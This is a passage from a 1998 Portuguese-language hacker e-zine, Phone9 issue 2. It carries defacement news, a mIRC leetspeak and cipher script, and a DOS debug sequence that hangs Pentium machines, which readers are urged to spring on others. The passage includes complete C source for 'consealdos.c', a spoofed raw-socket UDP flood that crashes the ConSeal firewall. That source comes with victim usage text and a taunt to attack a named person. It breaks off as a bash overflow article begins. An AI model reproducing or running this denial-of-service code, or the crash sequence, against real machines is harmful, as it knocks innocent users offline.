@@ -1,0 +1,3614 @@
+		  P h o n e 9 (c) 1 9 9 8  p r o d u c t i o n s
+			  reg - (r) none rights reservaded.
+
+                   __                                   
+         __/\______\ \_  ________   ________    _______ ___/\_
+         \__      //   \/        \__\___   /____\__   _/  _   \
+         //   --  /  [-]\   __/   \    /_     /  /_____\___.  /
+       _/     ___/___/   \_     __/\____/    /______   /__/ //
+       \/----/      /_____\\___/      //____/     /____\____/
+  	        [c]		P h o n e 9 (c) p r o d u c t i o n s.
+
+
+								  the phone9 communications,
+								     - http://www.phone9.org
+....												....
+Phear Yer Phone, 01 de novembro de 1998.			 Phone9 Communications
+edicao no.02| phone9@phone9.org					   systems, Inc.
+[P9] ------------------------------------------------------------------ [P9]
+[m o l e c u l e s]	     [face your phear]		   [s e l u c e l o m]
+				      [gigant robots]
+			        [intergalatik kriminal]
+
+ Bem vindo a mais uma edicao da Phone9, 			        .[ektoplazma.]
+							 editors: kleptomaniak - bloodroot
+---											 	 ---
+     P h o n e 9   c o m m u n i c a t i o n s   s y s t e m s , i n c
+
+     _____  ____		   
+    /   _ \/ _  \          editor-in-chief: bloodroot|kleptomaniak       [P]
+    \  ___/\__  /                co-editor: ]Puruc4[ 	                   [H]
+     \ \.[P9]/ /                    layout: ]Puruc4[                     [O]
+	\/     \/          relacoes publicas: Dr. Eneas [PR0NA]            [N]
+    [the phone9]           		 31337: bahamas, paranoia, Cacaio    [E]
+     [systems.]              askii efektiz: bloodroot - alph1x t3k       [9]
+	                                                          Phone9, Inc.
+
++-- -- --- -- ---- --- --+ the evil empire
+			  .user| face your phear, Now!!!
+				 : '98 productions. [c]
+[Ph0ne9.]			 +--- ---  ---  - -----  ---  ---  -+ Punkass Stuffs
+
+  The Phone9 Communications Systems, <table of contents.> 
+
+    1] .ph0ne9.sp0ts
+    2] 31337.ini, o IRC zkr1pt dos dUhd1nh4s - by bloodroot & paranoia
+    3] Conseal Firewall Killer - by k2
+    4] /bin/bash buffer overflow, cartas de amor para bash
+    5] Microsoft Internet Exploder BUG!!! <object> boguzes
+    6] Bill Gate e' a besta (666) - by beltra
+    7] Anti Bina System, Hackeando sistema telefonicos digitais
+    8] Netbus Sekurity Advisory
+    9] Protegendo sua maquina contra loops - by Kasper
+   10] Rompendo permissoes em sistemas NT
+   11] .login backdoor
+   12] Eworm project - by Dr.Sm0g & tAff.
+   13] /lost+found, the P9 garbage can
+   14] IIS security issues, trabalhando com logs
+   15] Novell Netware login Hack
+   16] POP3 sniffer
+   17] 0800 hack-a-call - by Dare Devil
+   18] Wire tapping!!! Hackeando linhas telefonicas
+   19] Password smugler
+   20] Microsoftz advisory: ICQ, warez group???
+   21] selbstmordert, o fim esta proximo
+          _   _          
+         ((___))                       
+        [  x x  ]          
+         \     /                       
+    _____('(U)')_____      also starring in the P9 enterprise, 
+   / P9           P9 \        
+  /   /\ __/ \__ /\   \      
+  \ __\/  '___'  \/__ /   director                     blood Weirdo arouto
+  /    \  /_|_\  /    \   co-director                  Dr. Samurai Sm0guzes    
+  \_|__/_ |_|_| _\__|_/   Special Guest                Ugly bi0h4zard    
+     \____[:():]____/     Camera man I                 "Exceptional" x1p
+     |.:    .:     \	  Camera man II                Alph1x Star Tr3k
+    /.      \:.     \_	  Naked girl dancing           Cezinha Terezinha
+ __/.        \        \   Stupid bitch back there      deathwh0re.com
+ \    ___    /_   ___  \  Stupid bitch out there       unWizard Magic of Oz.
+  \__/   \__/  \_/   \_/  systems failure              The Bad Cowz...
+     \_|_/	[P9] \_|_/    The uglyest name around      dare^devil
+
+                                                    ......:
+        					    ...............  .:
+               - [www.phone9.org] -     :by Bloodroot : ..:
+	  :...............................:& Dr.Sm0g    : ..:
+        ................................:...       ...:...:
+        :  - Phone9 Journal, no.02      : productions : ..:
+        :...............................:..        ...:  .:
+    	   :..... [ ] - [ Phone9 ] - [ ] ...................:
+
+
+	quotas.:
+	 Paranoia mata o pau, mostra a cobra e balanca o pin** - O povao.
+	 smack my dick up - x1p
+	 Size does matter, ask to ya mamma!!! - alph1x t3k.
+
+		                --> ph0ne9.0rg <--	
+
+	agradecimentos: cacaio, e o pessoal da deathknights... udigrudi.0rg,
+	e e' claro o pessoal da bos(ta)-br... =) thanx you'all.
+[P9]  ----------------------------------------------------------------  [P9]
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³1 - .ph0ne9.sp0ts									 ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by Bloodroot & pals ³°°
+                                                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+   Bem vindo a mais uma edicao da Phone9,  nos estamos comemorando  a 3a.
+   Conseguimos passar por todos  os nossos problemas e  conseguimos,  por
+   fim, sobreviver 2 edicoes da zine :) Nos agora  estamos com um time de 
+   pessoas muito mais desenvolvido, e nos especificamos mais algumas coi-
+   sas quanto a zine, nos especificamos as datas de lancamento da zine... 
+   Veja:
+
+		      01 de novembro -- edicao no.02'98 [G. wonder what it is??]
+	            01 de  janeiro -- edicao no.03'99
+			01 de    marco -- edicao no.04'99
+			01 de     maio -- edicao no.05'99
+                  01 de    julho -- edicao no.06'99
+			01 de setembro -- edicao no.07'99
+ 			01 de novembro -- edicao no.08'99
+			01 de  janeiro -- edicao no.09'2000
+
+   Basicamente, a zine sai a cada 2 meses,  ou seja, a edicao 09 da  zine
+   saira no primeiro dia do seculo 2000, se o mundo nao for destruido se-
+   gundo as profecias de Nostradamus, entao a edicao  sera lancada dia 01
+   de janeiro do seculo 2000.
+
+   Quanto ao problema com a phone9.org, nos ja resolvemos isto e enquanto
+   o servidor nao fica pronto,  os endereco que voce pode acessar a  zine 
+   sao:
+
+	  http://www.puruca.com.br/phone9.
+	  http://www.deathknights.com/phone9
+	  http://microsoftz.cjb.net
+	  http://www.ereethackers.com/phone9
+        http://www.webcrunchers.com/phone9
+        http://www.webelite.com.br/phone9
+        
+     Todos  estes sites estao 24h. por dia funcionando, talvez exceto o
+     ereethackers.com, pois este servidor e' meio louco. =)
+
+	   Em breve, (021)xxx.xxxx BBS da Phone9, quando estiver toda
+	   setupada, nos iremos avisar voces.
+
+   Bom, agora que algumas questoes da zine ja foram explicada, e resolvi-
+   das entre nos e os leitores (eu acho :)) entao vamos para frente com a
+   zine. :)  
+
+     [.m0td.]
+       "Oh Migod, they killed kenny... You bastard" - Stan 
+	 
+   Acaba uma edicao e nos estamos la,  firme  e forte escrevendo a  zine,
+   e eu tenho que admitir e dificil rodar uma zine, pois existem um bando
+   de gente muito estranha, ou querendo desbancar a zine, ou entao mandan
+   do todos os tipos de flood para o seu email, e deprimente a quantidade
+   de coisas que nos vemos por ai, e a quantidade de coisas que nos manda
+   mos para o lixo :) Cada maniaco que aparece, mandando mensagens anony-
+   mas pelo anonymizer dizendo que pegou meu telefone, meu endereco com o
+   ultimo vibrador lancado, e impressionante como estes carinhas se acham
+   deuses... Com seus estupidos nukes, e pings, que  depois de um  tempo,
+   mudam de nick, e perguntam como se instala o linux.... Bah!!!  E  cada
+   coisa que me  mandam, uma vez um cara colocou meu email em um tipo  de
+   pesquisa, que enviam mais de 500kbytes por hora para o seu mail... Que
+   coisa naum... Eles pelo menos  sabem escrever o meu email  direitinho,
+   ou sera que foi a baba deles que escreveu para eles??? Bom, ai nos fi-
+   camos em contradicao, ja que depois que  nos ensinamos a  desativar  o
+   CyberPatrol, tem um bando de porno-kidyes que andam fazendo coisas bem
+   malvadas, considerando que o comum: "Clica... Clica... Clica... Aihhh"
+   ja nao e' mais comum para eles :) Quantos nerds e merds que existem ai
+   eu fico ate espantado, pois as vezes eu penso:   Sera que demencia  e' 
+   contagiosa??? Pois ao que me parece,  e muito mais  contagioso do  que
+   pensavamos... Ou apenas sera a volta dos Master Of Shit??? Bom, depois
+   do que o Sm0g fez no site deles  (psynet.net/moszine) voce pensa  sera 
+   que um deles foi assassinado pelas suas tecnicas 31337??? Ou sera  que
+   o sabio, percebeu que nao conseguia entrar para a AACD, mesmo escreven
+   do daquela forma tao perigosa e malvada como eles escrevem... 53r4????
+   
+   E mudando de malvados para futeis, nos ficamos sabendo que a  miramax,
+   conhecido estudio de cinema, esta produzindo um filme sobre a historia
+   do Kevin Mitnick, baseado no livro takedown, escrito por John Markoff,
+   e Shimomura, o livro e' a historia ficcionaria da captura de  Mitnick,
+   adulterada com as mentiras as quais John Markoff e Shimomura  inventa-
+   ram neste livro, varios fatos mentirosos sobre a historia serao descri
+   tos no filme, como uma briga corpo a corpo, entre Shimomura e Mitnick,
+   onde Mitnick, sendo o malvado e criminoso,  pega uma tampa de lata  de
+   lixo e bate na cara de Shimomura, deixando o japaboy em knock out!  :)
+   A indignacao quanto a mentira que sera mostrada no filme, causa varios
+   protestos contra o filme da Miramax, pois e' bem possivel que os fatos
+   descritos no filme e que sao simplesmente falsos, possam interferir em
+   um possivel julgamento contra Kevin Mitnick, se houver algum...   Pois
+   alguns futeis e comprados jures, que concerteza serao intimidados pela
+   rede de mentiras que o filme expoe quanto ao caso do mitnick.   Varios
+   grupos de protecao de hackers como EFF e outros, estao indignados  com
+   a futilidade e mentiras que o filme propoe... Quem  deseja saber  mais
+   sobre o filme veja os enderecos e sites abaixo:
+
+	Endereco dos estudios Miramax em Hollywood, USA:
+	7966,  Beverly Blvd.
+	Los Angeles, CA 90048
+	001+(213)951-4200 Phone
+	001+(213)951-4315 fax 
+	ou...
+	375 Greenwich St., 3o. Andar
+	New York, NY 10013
+	001+(212)941-3800 Phone
+	001+(212)941-3949 fax
+
+	Kevin Mitnick Defense Fund:
+	www.kevinmitnick.com
+	www.freekevin.org
+	www.phone9.org/foi
+
+   Ainda quanto ao caso do Kevin  Mitnick,  ele nao recebe um  julgamento
+   a mais de 3anos e alguns meses. Entao agora nos fazemos um apelo  para
+   todas as pessoas que tem um site, que coloquem um contador de a quanto
+   tempo kevin D. Mitnick continua preso sem um julgamento, ai vao as in-
+   trucoes:
+--
+Primeiro passo:
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+<BODY TEXT="#29C413" BGCOLOR="#000000" LINK="#FDF511" VLINK="#FDF511"  
+ONLOAD="startclock();">
+^^^^^^^^^
+O seu <body> deve ficar assim:
+
+Segundo Passo: Copie este script para o seu index.html
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+<SCRIPT LANGUAGE="JavaScript"><!--
+// this script was provided by
+// Stefan - the Programinator
+// mailto:trickys@doomhammer.com
+// http://www.doomhammer.com
+// with very minor modification by kiratoy@2600.com
+// please credit him accordingly if you use this script
+// thanks 
+Go to the web site and copy from <script> to </script>
+// --></SCRIPT>
+
+
+
+Terceiro Passo: Paste the table below in you document.
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+<TABLE CELLSPACING="0" CELLPADDING="0" WIDTH="100">
+      <TR>
+        <TD ALIGN="center">
+          <FORM NAME="frm"><INPUT TYPE="textarea" NAME="left" SIZE="60" 
+           VALUE="Checking..."></FORM></TD>
+        </TR>
+      <TR>
+        <TD><FONT FACE="verdana"><FONT COLOR="#FFFFFF"><FONT SIZE="-1">Kevin
+            Mitnick Contador: Este e' o tempo em que Kevin Mitnick, nao tem
+            um julgamento cedido pelo governo americano.
+            </FONT></FONT></FONT></TD>
+          </TR>
+        </TABLE> </TD>
+      </TR>
+    </TABLE>
+--
+
+   Recentemente varias listas de discussoes tem falado bastante sobre uma    
+   possivel conferencia hacker no Brasil,  semelhante a  DefCon e  muitas
+   outras por ai.. O pessoal da Bos e outros lugares estao tentando fazer
+   um encontro deste tipo, datas, nomes, promovedores entre outros  deta-
+   lhes, ainda estao sendo organizados e nao tem data de estreia e nem de
+   esperanca, por enquanto nos so ficamos  na vontade de ter  um encontro
+   do tipo, por isso nos pedimos a colaboracao de  quem puder  contribuir
+   com algo para o evento, servidores, empresas de seguranca, consorcios,
+   bureaus de informatica e ate anonimos podem contribuir com esta campa-
+   nha, apenas manda um email para: blood@puruca.com.br, que nos entrare-
+   mos em contato com voces.
+
+   Quanto a invasao da Mandioca, pelos camaradas da Nearz,  eu achei  uma
+   boa atidude deles em mudar a pagina, ja que todos tinham acesso na man
+   dic, mas ninguem tinha coragem de mudar o htm ou entao porque nao que-
+   riam que o acesso ao servidor seria acabado, acabou que a nova dona da
+   Mandioca, foi comprada pelo preco de uns bons megabytes de  wordlists,
+   espero que os administradores da mandic nao fiquem muito chateados com
+   a frustacao que eles causaram no seu sistema. :)
+   Voce pode contatar a nearz pelo endereco:
+
+	http://members.tripod.com/nearz
+	http://www.cyberspace.com/~nearz
+	http://www.phone9.org/nearz --> Soon...
+	http://www.microsoftz.com/nearz
+   
+   O bug do ano 2000, continua acabando com as maquininhas por ai :) Ele
+   agora tambem afeta computadores que trabalham em pequenos escritorios
+   como os das locadores de videos, que so tem 2 digitos no lugar do ano
+   ao invez de 4.  Vejamos como 4 numeros afetam a vida de muita  gente, 
+   tem programador cobrando 30 dolares por linha de codigo mudada. Deve-
+   rao sair muitos M$ deste negocio... anti-2000 Concept???
+
+   E para os moloides de carteria executem o seguinte e travem a sua ma-
+   quinas que rodam pentium!!! hehehehehe...
+
+Para testar a vulnerabilidade do pentium no seu computador, faca o seguinte:
+no prompt do DOS: (obs. e' melhor que voce faca isto pelo DOS mesmo... :))
+
+debug
+n debug.com
+a
+db f0
+db 0s
+db c7
+db c8
+rcx
+4
+w
+
+   Quando voce acabar de digitar este ultimo comando, entao voce sabe
+   que o seu computador travou, e voce tera que reboota-lo dali :)
+              [.m0td.] --- [ The  End ] -- [.m0td.]
+
+				 1998. (c) phone9.org
+
+.[news].		       - breaking tha news -                      .[news]. 
+
+   [19/09] - Telerj finalmente reduz a tarifa em alguns servicos que ela
+		 oferece, como:  O valor da  instalacao de novas linhas e  o 
+	 	 plano de expansao, teve uma reducao no seu preco tambem.
+		 As reducoes na instalacao de linhas caiu de $147,99  para o
+		 ainda alto $82,25. O preco dos telefones comprados no plano
+		 de expansao teve uma reducao de 45,65%, o que torna o preco
+		 de $142,68 reais para $77,54 e os novos lerdos das telerdas
+		 tambem  terminaram com a cobranca de levar a linha, da cai-
+		 xa de verificacao (armario), ate a caixa do predio e  assim
+		 por diante ate a casa do usuarios.  Eu acho que  finalmente
+		 vou poder colocar aquela LP na minha casa :) ?!?!
+   
+   [02/09] - Site  filial  ao da nasa.gov,  foi invadido  por raquers, o
+		 grupo HFG 'Hacking for Girlies' tem ultimamente feito a cam
+		 panha de purificacao dos sites. :)Invadindo sites que  eles
+		 possam ter em mente. Na  lista dos  atacados estao os:
+             nytimes.com|jpl.nasa.gov, entre outros. 
+
+   [06/09] - A MANDIoCa, foi invadido pelo NearDz, mudando a pagina ofi-
+		 cial da mandic ( index.html), se  voce quiser ver a  pagina
+		 hackeada da nova dona da mandic, va em:
+		 - deathknights.com/phone9/mandioca.html 
+
+   [14/09] - Slashdot, o centro de informacoes para linux nerds, foi in-
+		 vadido recentemente por um dUhD1nhas chamado de H4G1S, este
+		 ninja,  foi o mesmo que invadiu o  nasa.gov em 97. O que e'
+		 mais interessante na sua invasao é que durante a invasao da
+		 nasa, ele clamou por justica nos casos do BernieS e Mitnick
+		 desta vez ele manda um simples e puro  "fuck kevin mitnick"
+		 e uma penca de outros caras. 
+
+   [13/09] - New York Times Hackeado, pelo grupo HFG, em protesto contra
+		 a grande investida na midia, implicando que mitnick seja um
+		 ladrao moderno, o ataque foi dedicado a John Markoff, o es-
+		 critor do livro sobre mitnick takedown e' o jornalista mais
+		 estupido, que fez toda a difamacao contra mitnick durante a
+		 sua procura.
+
+   [16/09] - X-ploit, grupo hacker mexicano, invadiu mais um site gover-
+		 namental do mexico, realmente nao tenho muito informacao so
+		 bre o motivo da invasao, mas voces sabem, derrepente sera a
+		 resulreicao do exercito zapatista na internet???
+             Frase muito comum do grupo x-ploit: "O mexico e' para os me
+             xicanos, a internet e' para o Xploit."
+
+   [19/09] - Chico.com.br, foi hackeado por um dos membros da Phone9, Puruca
+		 o site foi invadido em protesto ao lamer, que se dizia o racker
+		 do momento, sendo ele e a mae dele, um bando de lamers de merda
+		 Voce pode ver a pagina hackeada em www.puruca.com.br/chico.html
+
+   [21/09] - Testemunho do clinto e' mostrado na TV em mais de 400 canais si
+		 multaneamente no mundo todo... Espero que ele nao tenha respon-
+		 dido a questao sobre o tamanho do bigulhim dele. ;)
+
+   [01/10] - Lancado o askii pack da Phone9, feito por alph1x t3k e b_root,
+             Este pode ser achado em: puruca.com.br/phone9/askiiat.txt
+
+   [30/10] - Crai.com.br, hackeada por Fak, que deixou uma mensagem para nos
+             e para o pessoal da microsoftz.cjb.net!!! 
+
+            bloodroot
+     bloodroot@webcrunchers.com
+   [Gettin' seek of being weirdo]
+     [being a 'especial' dude]
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³2 - 31337.ini, o script elitaum para IRC			             ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  by paranoia & b_root ³°°
+								 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+	O pessoal da Udigrudi, criou um script elitaum para IRC, que
+      faz com que suas letras fiquem mais 31337 que nunca.   Assim
+      voce pode assustar os ratoes que existem pela net. :) 
+	O 31337.ini, faz parte da campanha de produtos desenvolvidos
+      pela Campanha, Salvem as formigas do Sul  do Paquistao,  que
+	esta associado com a microsoft.com e e' claro com o  sistema
+	(011)1406 e o 'Ligue Jah.', entao em mais uma producao 31337
+	nos apresentamos 31337.ini, o script elitaum...	
+
+	     thanx to: paranoia - alquem K. naoseioque Gay
+
+ Bom, por enquanto nesta edicao nos oferecemos duas funcoes para o zkr1pt,
+ a primeira e': Transformar a sua escrita para 31337, e a segunda e encrip
+ tar as conversas no IRC.
+ 
+
+	-- 31337.ini -- para todos os dUhD1nHas ai fora, b1tch3z f0r j00z!!
+n0=ele {
+n1= say :::::> zkr1pt elitaum 2000, 31337.ini <:::::
+n2= say ::::::> 0 2kr1p7 313374um d0 br4211 <:::::::
+n3= say :::::::::[ http://www.phone9.org ]::::::::::
+n4= say ::::::::::|by paranoia|bloodroot|:::::::::::
+n5= say ----- 5173 elitaum -> udigrudi.org <- ------
+n6= set %var.textl *1
+n7= set %var.textl $replace(%var.textl,e,3)
+n8= set %var.textl $replace(%var.textl,i,1)
+n9= set %var.textl $replace(%var.textl,a,4)
+n10= set %var.textl $replace(%var.textl,s,5)
+n11= set %var.textl $replace(%var.textl,t,7)
+n12= set %var.textl $replace(%var.textl,o,0)
+n13= set %var.textl $replace(%var.textl,l,1)
+n14= set $var.textl $replace(%var.textl,g,9)
+n15= set $var.textl $replace(%var.textl,z,2)
+n16= set $var.textl $replace(%var.textl,k,/{)
+n17= set $var.textl $replace(%var.textl,y,j)
+n18= set $var.textl $replace(%var.textl,elite,31337)
+n19= set $var.textl $replace(%var.textl,eleet,31337)
+n20= set $var.textl $replace(%var.textl,eleeti,313371)
+n21= say %var.textl
+n22=}
+n23=Decrypto{
+n24=set %encrypto *1
+n25=%encrypto = $replace(%encrypto,^,.)
+n26=%encrypto = $replace(%encrypto,*,?)
+n27=%encrypto = $replace(%encrypto,»,!)
+n28=%encrypto = $replace(%encrypto,ë,a)
+n29=%encrypto = $replace(%encrypto,¥,b)
+n30=%encrypto = $replace(%encrypto,£,c)
+n31=%encrypto = $replace(%encrypto,",d)
+n32=%encrypto = $replace(%encrypto,ç,e)
+n33=%encrypto = $replace(%encrypto,ô,f)
+n34=%encrypto = $replace(%encrypto,³,g)
+n35=%encrypto = $replace(%encrypto,í,h)
+n36=%encrypto = $replace(%encrypto,|,i)
+n37=%encrypto = $replace(%encrypto,¬,j)
+n38=%encrypto = $replace(%encrypto,%,k)
+n39=%encrypto = $replace(%encrypto,½,l)
+n40=%encrypto = $replace(%encrypto,m,®)
+n41=%encrypto = $replace(%encrypto,å,n)
+n42=%encrypto = $replace(%encrypto,¡,o)
+n43=%encrypto = $replace(%encrypto,¤,p)
+n44=%encrypto = $replace(%encrypto,«,q)
+n45=%encrypto = $replace(%encrypto,²,r)
+n46=%encrypto = $replace(%encrypto,µ,s)
+n47=%encrypto = $replace(%encrypto,¶,t)
+n48=%encrypto = $replace(%encrypto,©,u)
+n49=%encrypto = $replace(%encrypto,¢,v)
+n50=%encrypto = $replace(%encrypto,·,w)
+n51=%encrypto = $replace(%encrypto,`,x)
+n52=%encrypto = $replace(%encrypto,ß,y)
+n53=%encrypto = $replace(%encrypto,ä,z)
+n54=/echo 4 %encrypt
+n55=}
+n56=Encrypto {
+n57=set %encrypto *1
+n58=%encrypto = $replace(%encrypt,.,º)
+n59=%encrypto = $replace(%encrypt,?,±)
+n60=%encrypto = $replace(%encrypt,!,»)
+n61=%encrypto = $replace(%encrypt,a,ë)
+n62=%encrypto = $replace(%encrypt,b,¥)
+n63=%encrypto = $replace(%encrypt,c,£)
+n64=%encrypto = $replace(%encrypt,d,“)
+n65=%encrypto = $replace(%encrypt,e,ç)
+n66=%encrypto = $replace(%encrypt,f,ô)
+n67=%encrypto = $replace(%encrypt,g,³)
+n68=%encrypto = $replace(%encrypt,h,í)
+n69=%encrypto = $replace(%encrypt,i,|)
+n70=%encrypto = $replace(%encrypt,j,¬)
+n71=%encrypto = $replace(%encrypt,k,%)
+n72=%encrypto = $replace(%encrypt,l,½)
+n73=%encrypto = $replace(%encrypt,m,®)
+n74=%encrypto = $replace(%encrypt,n,å)
+n75=%encrypto = $replace(%encrypt,o,¡)
+n76=%encrypto = $replace(%encrypt,p,¤)
+n77=%encrypto = $replace(%encrypt,q,«)
+n78=%encrypto = $replace(%encrypt,r,²)
+n79=%encrypto = $replace(%encrypt,s,µ)
+n80=%encrypto = $replace(%encrypt,t,¶)
+n81=%encrypto = $replace(%encrypt,u,©)
+n82=%encrypto = $replace(%encrypt,v,¢)
+n83=%encrypto = $replace(%encrypt,w,·)
+n84=%encrypto = $replace(%encrypt,x,`)
+n85=%encrypto = $replace(%encrypt,y,ß)
+n86=%encrypto = $replace(%encrypt,z,ä)
+n87=say  %encrypto $+ (zkr1pt 31337 2000.)
+n88=}
+
+  -- 31337.ini -- para todos os dUhD1nHas ai fora, b1tch3z f0r j00z!!
+
+31337.ini, toda a edicao da Phone9, um novo update do 31337.ini by paranoia,
+e alguem K. Gay, e com novos updates do bloodroot.
+
+dUhD1Nh45, os idiotas por tras de todo o plano mal feito =)
+
+7h3 31337 & 7h4 dUhD1Nh45!!!
+by paranoia - bloodroot.
+[blood@phone9.org]|[paranoia@phone9.org]
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³3 - Conseal Firewall Killer			             			 ³°°
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by k2.  ³°°
+                                                              ÀÄÄÄÄÄÄÄÄÄÄÙ°°
+
+		ConSeal firewall killer
+		by k2.
+
+  O firewall Conseal da signal9 (signal9.com),  tem uma vulnerabilidade
+  nas sua estruturas, permitindo que voce possa fechar  o firewall  por
+  meio de um ataque DoS, e' bem util na hora de  mandar pacotes  obscu-
+  ros para  usuarios de  win95/98,  a empresa  ainda nao lancou  nenhum
+  mas e' seguramente recomendavel que voces usem outro firewall pessoal
+  (nao recomendo nenhum,  ipfwadm???). O bug se  divide em duas partes,
+  na primeira ele explora a opcao 'learning' do firewall, da qual novas 
+  novas regras de tratamento  de pacotes do firewall sao adaptados,  um
+  grande flood no IP que roda o firewall, assim a cada pacote especial,
+  novas regras serao adaptadas, ate' que o numero de regras fique cheio
+  ai o firewall fecha e o sistema reboota. A segunda parte do bug, se a
+  opcao  de logar todos  os ataques, entao voce pode mandar um flood de 
+  ataques que  este ira  logar todos,  se a  quantidade for  extensiva
+  de pacotes for o suficiente para lotar o HD da vitima, caso isto acon
+  teca, entao o programa fecha e provavelmente o sistema ira rebootar;)
+
+	Veja o codigo abaixo. by Noc-Wage.
+
+--[ consealdos.c ]--
+#include<sys/types.h>
+#include<sys/socket.h>
+#include<netinet/in_systm.h>
+#include<netinet/in.h>
+#include<netinet/ip.h>
+#include<netinet/udp.h>
+#include<errno.h>
+#include<strings.h>
+#include<netdb.h>
+#include <stdlib.h>
+#include<stdio.h>
+#ifdef BROKEN_LIBC
+#include <arpa/inet.h>
+#else
+#define u_char unsigned char
+#define u_short unsigned short
+#endif
+
+struct sockaddr sa;
+
+int main(int argc,char **argv)
+{
+int fd;
+int x=1;
+int hosti=192;
+int hostii=168;
+int hostiii=1;
+int meep=0;
+int fooport=1;
+int numpack=0;
+char funhost[15];
+struct sockaddr_in *p;
+struct hostent *he;
+u_char gram[36]=
+ {
+ 0x45, 0x00, 0x00, 0x26,
+ 0x12, 0x34, 0x00, 0x00,
+ 0xFF, 0x11, 0, 0,
+ 0, 0, 0, 0,
+ 0, 0, 0, 0,
+
+ 0, 0, 0, 0,
+ 0x00, 0x12, 0x00, 0x00,
+
+ '3','1','3','3','7','8','9','0'
+ };
+
+if(argc!=3)
+ {
+ fprintf(stderr,"Saihyousen, by Noc-Wage\n");
+ fprintf(stderr,"The faster your connection to the internet is (latency
+wise, not bandwidth)\n");
+ fprintf(stderr,"and the lower the CPU speed of the victim
+will\nincrease probability of success\n");
+ fprintf(stderr,"usage: %s victim num_of_packets Ex: saihyousen
+127.0.0.1 40000\n",*argv);
+ exit(1);
+ };
+if((fd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))== -1)
+ {
+ perror("requires RAW SOCKETS");
+ exit(1);
+ };
+
+#ifdef IP_HDRINCL
+if (setsockopt(fd,IPPROTO_IP,IP_HDRINCL,(char*)&x,sizeof(x))<0)
+ {
+ perror("setsockopt IP_HDRINCL");
+ exit(1);
+        };
+#else
+fprintf(stderr,"we don't have IP_HDRINCL :-(\n\n");
+#endif
+
+/* The stuff below is so that it's not fully sequential  i.e
+   100.100.100.101, 100.100.100.102  */
+for (numpack=0;numpack<=atoi(argv[2]);numpack++) {
+ if (meep==0) { ++hosti; meep++; }
+ if (hosti>254) hosti=1;
+ if (meep==1) { ++hostii; meep++;}
+ if (hostii>254) hostii=1;
+ if (meep==2) { ++hostiii; meep=0;}
+ if (hostiii>254) hostiii=1;
+
+sprintf( funhost, "%i.%i.%i.%i",hosti,hostii,hostiii,hosti);
+(he=gethostbyname(funhost));
+bcopy(*(he->h_addr_list),(gram+12),4);
+
+if((he=gethostbyname(argv[1]))==NULL)
+ {
+ fprintf(stderr,"can't resolve destination hostname\n");
+ exit(1);
+ };
+bcopy(*(he->h_addr_list),(gram+16),4);
+fooport++;
+/* resets the port to 1 if it's nearing the end of possible values */
+if (fooport>65530) {fooport=1;};
+*(u_short*)(gram+20)=htons((u_short)fooport);
+*(u_short*)(gram+22)=htons((u_short)fooport);
+
+p=(struct sockaddr_in*)&sa;
+p->sin_family=AF_INET;
+bcopy(*(he->h_addr_list),&(p->sin_addr),sizeof(struct in_addr));
+
+if((sendto(fd,&gram,sizeof(gram),0,(struct sockaddr*)p,sizeof(struct
+sockaddr)))== -1)
+ {
+ perror("sendto");
+ exit(1);
+ };
+/* printf("Packet # %i\n", numpack); */
+/* Turn that on to see where you are.. it'll slow the attack though */
+};
+printf("Attack against %s finished", argv[1]);
+putchar('\n');
+return 1;
+} 
+--[ consealdos.c ]--
+
+  Para se proteger contra este tipo de ataque e' bem simples, apenas
+  deshabilite as opcoes de 'log attack' e 'new rules', assim o fire-
+  wall fica seguro contra estes tipos de ataques... ;)
+
+obs: phineas usa conseal, DoS nele!!!! heheheh
+k2@phone9.org - k2@microsoftz.com
+ ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+ ³4 - /bin/bash buffer overflow, cartas de amor para bash			 ³°°    
+ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ by bloodroot.  ³°°
+                                                       ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ°°
+
+	Bom, recentemente alguem com um nome muito estranho (hihihi!),
+	descobriu um buffer overflow dentro  do /bin/bash, que  ocorre
